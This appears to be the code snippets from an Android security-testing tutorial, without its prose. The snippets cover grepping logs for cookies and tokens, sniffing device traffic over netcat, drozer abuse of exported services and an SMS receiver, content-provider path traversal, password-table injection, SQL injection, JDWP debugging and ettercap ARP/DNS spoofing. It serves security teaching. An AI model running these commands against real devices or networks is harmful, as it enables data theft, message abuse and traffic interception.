["```kt\nadb logcat\n\n```", "```kt\nadb logcat [options] [filter]\n\n```", "```kt\n    E/ClockAlarmWidget( 6590): [AlarmWidgetIdManager] getListItem()\n    ```", "```kt\nadb logcat *:E\n\n```", "```kt\nadb logcat > output.txt\n\n```", "```kt\nadb logcat | [other program]\n\n```", "```kt\nadb logcat | grep [pattern]\n\n```", "```kt\nadb logcat | grep ApplicationManager\n\n```", "```kt\nadb logcat | grep [Cc]ookie\nadb logcat | grep \"http[s]*\"\nadb logcat | grep \"ftp[s]*\"\n\n```", "```kt\nadb logcat | grep –i \"[\\w\\s_-]*token[\\w\\s_-]*\"\n\n```", "```kt\nadb shell monkey –p [package] –v [event count]\n\n```", "```kt\nadb shell monkey –p Flipboard.app –v 10\n\n```", "```kt\n    su\n    mkdir /data/tcpdump/\n    chmod 755 /data/tcpdump/\n\n    ```", "```kt\n    adb push tcpdump /data/tcpdump/.\n    adb shell chmod 755 /data/tcpdump/tcpdump\n\n    ```", "```kt\n    nc\n\n    ```", "```kt\n    ./data/tcpdump/tcpdump –w - | nc –l –p 31337\n\n    ```", "```kt\n    adb forward tcp:12345 tcp:31337\n\n    ```", "```kt\n    netcat 127.0.0.1 12345\n\n    ```", "```kt\n    adb forward tcp:12345 tcp:31337 && netcat 127.0.0.1 12345 | wireshark –k –S –i – \n\n    ```", "```kt\nsu; mkdir /data/tcpdump/; chmod 755 /data/tcpdump/\n\n```", "```kt\nadb push tcpdump /data/tcpdump/.\nadb shell chmod 755 /data/tcpdump/tcpdump\n\n```", "```kt\n    <uses-permission android:name=\"android.permission.GET_TASKS\"/>\n\n    ```", "```kt\n    from drozer.modules import Module,common\n    from drozer.modules import android\n    class Intents(Module, common.PackageManager):\n      name = \"Dump recent intents to the console\"\n      description = \"This module allows you to see the most recent intents that were sent, via the ActivityManager\"\n      examples = \"run ex.sniffer.intents\"\n      author = \"[your name]\"\n      date = \"[the date]\"\n      license = \"GNU GPL\"\n      path = [\"ex\",\"sniffer\"]\n      def execute(self,arguments):\n        self.stdout.write(\"[*] initializing intent sniffer…\\n\")\n        context = self.getContext()\n        activityService = context.getSystemService(\"activity\")\n        self.stdout.write(\"[*] got system service ..\\n\")\n        recentTasks = activityService.getRecentTasks(1000,1)\n        self.stdout.write(\"[*] recentTasts Extracted..\\n\")\n        list_length = recentTasks.size()\n        self.stdout.write(\"[*] Extracted %s tasks ..\\n\" % (list_length))\n        for task in range(list_length):\n          cur_task = recentTasks.get(task)\n          cur_taskBaseIntent = cur_task.baseIntent\n          self.stdout.write(\"\\t[%d] %s\\n\" % (task,cur_taskBaseIntent.toString()))\n    ```", "```kt\n    dz> module install [path-to-module-repo]/ex.sniffer.intent\n\n    ```", "```kt\n    dz> run ex.sniffer.intents\n\n    ```", "```kt\nOWASP GoatDroid project. Try reading through this, and think about the possible dangers and risks for this setup:\n```", "```kt\n<service android:name=\".services.LocationService\" >\n  <intent-filter>\n    <action android:name=\"org.owasp.goatdroid.fourgoats.      services.LocationService\" />\n  </intent-filter>\n</service>\n</application>\n  <uses-permission android:name=\"android.permission.SEND_SMS\" />\n  <uses-permission android:name=\"android.permission.CALL_PHONE\" />\n  <uses-permission android:name=\"android.permission.    ACCESS_COARSE_LOCATION\" />\n  <uses-permission android:name=\"android.permission.    ACCESS_FINE_LOCATION\" />\n  <uses-permission android:name=\"android.permission.INTERNET\" />\n</manifest>\n```", "```kt\n     dz> run app.service.info –-permission null\n\n    ```", "```kt\n    dz> run app.service.start –-action [ACTION] –-category [CATEGORY] –-data-uri [DATA-URI] –-component [package name] [component name] –-extra [TYPE KEY VALUE] –-mimetype [MIMETYPE]\n\n    ```", "```kt\n    dz> run app.service.start –-component com.linkedin.android com.linkedin.android.authenticator.AuthenticationService\n\n    ```", "```kt\n    <service android:name=\".authenticator.AuthenticationService\" android:exported=\"true\">\n        <intent-filter>\n          <action android:name=\"android.accounts.AccountAuthenitcator\" />\n        </intent-filter>\n      <meta-data android:name=\"android.accounts.AccountAuthenticator\"\n      android:resource=\"@xml/authenticator\" />\n    </service>\n    ```", "```kt\n    AndroidManifest.xml file of the Android LinkedIn application.\n    ```", "```kt\n    dz> run app.service.start –-component com.linkedin.android com.linkedin.android.authenticator.AuthenitactionService –-action anroid.accounts.AccountAuthenitcator\n\n    ```", "```kt\ndz> run app.service.start –-component com.android.systemui com.android.systemui.PhoneSettingService\n\n```", "```kt\n <receiver\n    android:name=\".broadcastreceivers.SendSMSNowReceiver\"\n    android:label=\"Send SMS\" >\n    <intent-filter>\n        <action android:name=\"org.owasp.goatdroid.fourgoats.SOCIAL_SMS\" />\n    </intent-filter>\n</receiver>\n</application>\n\n    <uses-permission android:name=\"android.permission.SEND_SMS\" />\n    <uses-permission android:name=\"android.permission.CALL_PHONE\" />\n    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\" />\n    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\" />\n    <uses-permission android:name=\"android.permission.INTERNET\" />\n\n</manifest>\n```", "```kt\npublic void onReceive(Context arg0, Intent arg1) {\n  context = arg0;\n  SmsManager sms = SmsManager.getDefault();\n\n  Bundle bundle = arg1.getExtras();\n  sms.sendTextMessage(bundle.getString(\"phoneNumber\"), null,\n    bundle.getString(\"message\"), null, null);\n    Utils.makeToast(context, Constants.TEXT_MESSAGE_SENT, Toast.LENGTH_LONG);\n}\n```", "```kt\ndz> run app.broadcast.send –-action [ACTION] –-category [CATEGORY] –-component [PACKAGE COMPONENT] –data-uri [DATA_URI] –extra [TYPE KEY VALUE] –flags [FLAGS*] –mimetype [MIMETYPE]\n\n```", "```kt\ndz> run app.broadcast.send –-action org.owasp.goatdroid.fourgoats.SOCIAL_SMS –-component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver –-extra string phoneNumber 1234567890 –-extra string message PWNED\n\n```", "```kt\n    dz> run app.provider.info –-permission null\n\n    ```", "```kt\n    dz> run app.provider.finduri [package]\n\n    ```", "```kt\n    dz> run app.provider.finduri com.android.providers.downloads\n\n    ```", "```kt\n def findContentUris(self, package):\n\n    self.deleteFile(\"/\".join([self.cacheDir(), \"classes.dex\"]))\n\n    content_uris = []\n    for path in self.packageManager().getSourcePaths(package):\n// This is where the script requests the application path from the \n// package manager, which will determine where the actual .apk file\n// is stored.\n        strings = []\n\n        if \".apk\" in path:\n            dex_file = self.extractFromZip(\"classes.dex\", path,self.cacheDir())\n// In this line you can see the script extract the \"classes.dex\"\n// file from the .apk file\n\n            if dex_file != None:\n                strings = self.getStrings(dex_file.getAbsolutePath())\n\n                dex_file.delete()\n\n                # look for an odex file too, because some system packages do not\n                # list these in sourceDir\n            strings += self.getStrings(path.replace(\".apk\",\".odex\")) \n        elif (\".odex\" in path):\n            strings = self.getStrings(path)\n\n        content_uris.append((path, filter(lambda s: (\"CONTENT://\"in s.upper()) and (\"CONTENT://\" != s.upper()), strings)))\n// In this you can see the script actually search for the literal //\"CONTENT://\" or \"content://\" in the extracted .dex file.\n\nreturn content_uris\n```", "```kt\nrun app.provider.info –-permission null\nrun app.provider.finduri [package]\n\n```", "```kt\ndz> run app.provider.query [URI]\n\n```", "```kt\ndz> run app.provider.query content://settings/secure\n\n```", "```kt\ndz> run app.provider.download [URI]\n\n```", "```kt\ndz> run app.provider.download content://[valid-URI]/../../[other file path]    [local-path]\n\n```", "```kt\ndz> run app.provider.download content://vulnerabledatabase/../../../system/etc/hosts /tmp/hostsFileExtracted.txt\n\n```", "```kt\nrun app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys\n\n```", "```kt\nrun app.provider.query content://com.mwr.example.siever.DBContentProvider/Keys/\n\n```", "```kt\ndz> run app.provider.columns [URI]\n\n```", "```kt\ndz> run app.provider.columns content://com.mwr.example.seive.DBContentProvider/Passwords\n\n```", "```kt\ndz> run app.provider.insert [URI] [--boolean [name] [value]] [--integer [name] [value]] [--string [name] [value]]...\n\n```", "```kt\n--boolean –-double –-float –-integer –-long –-string –short\n```", "```kt\ndz> run app.provider.insert –-int _id 12 –-int from_account 31337 –-int to_account –-int amount 31337    content://com.example.vulnerabledatabase.contentprovider/statements \n\n```", "```kt\ndz>  run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Passwords –-int _id 3 –-string username injected –-string service injected –-string password woopwoop –-string email myspam@gmail.com \n\n```", "```kt\npublic boolean isValidUser(){ \nu_username = EditText( some user value );\nu_password = EditText( some user value );\n//some un-important code here...\nString query = \"select * from users_table where username = '\" +  u_username + \"' and password = '\" + u_password +\"'\";\nSQLiteDatabase db\n//some un-important code here...\nCursor c = db.rawQuery( p_query, null );\nreturn c.getCount() != 0;\n}\n```", "```kt\noccurs more often in real-world applications. So when auditing Android code for injection vulnerabilities, a good idea would be to look for something that resembles the following:\n```", "```kt\npublic Cursor query(Uri uri, String[] projection, String selection,String[] selectionArgs, String sortOrder) {\n   SQLiteDBHelper sdbh = new StatementDBHelper(this.getContext());\n   Cursor cursor;\n   try {\n//some code has been omitted  \n   cursor = sdbh.query(projection,selection,selectionArgs,sortOrder);\n   } finally {\n      sdbh.close();\n   }\n   return cursor;\n}\n```", "```kt\ndz> run app.provider.query [URI] –-selection \"1=1\" \n\n```", "```kt\ndz> run app.provider.query [URI] –-selection \"1-1=0\"\ndz> run app.provider.query [URI] –-selection \"0=0\"\n\ndz> run app.provider.query [URI] –-selection \"(1+random())*10 > 1\" \n\n```", "```kt\ndz> run app.provider.query content://com.example.vulnerabledatabase.contentprovider/statements –-selection \"1=1\"\n\n```", "```kt\n    dz> run app.package.debuggable \n\n    ```", "```kt\n    dz> run app.activity.start –-component com.example.readmycontacts com.example.readmycontacts.MainActivity \n\n    ```", "```kt\n    adb jdwp\n\n    ```", "```kt\n    adb forward tcp:[localport] jdwp:[jdwp port on device]\n\n    ```", "```kt\n    jdb –attach localhost:[PORT]\n\n    ```", "```kt\n    jdb –attach localhost:31337\n\n    ```", "```kt\n    classes\n\n    ```", "```kt\n    > methods [class-path]\n\n    ```", "```kt\n    > fields [class name ]\n\n    ```", "```kt\n    > fields com.example.readmycontacts.MainActivity\n\n    ```", "```kt\nsudo aptitude install ettercap-graphical\n\n```", "```kt\n    ettercap –T –I [interface] –M ARP:remote –P dns_spoof /[address of target] /[address of gateway]/\n\n    ```", "```kt\n    sudo ettercap –T –i wlan0 –M ARP:remote –P dns_spoof /192.168.10.1/ /192.168.10.106/\n\n    ```"]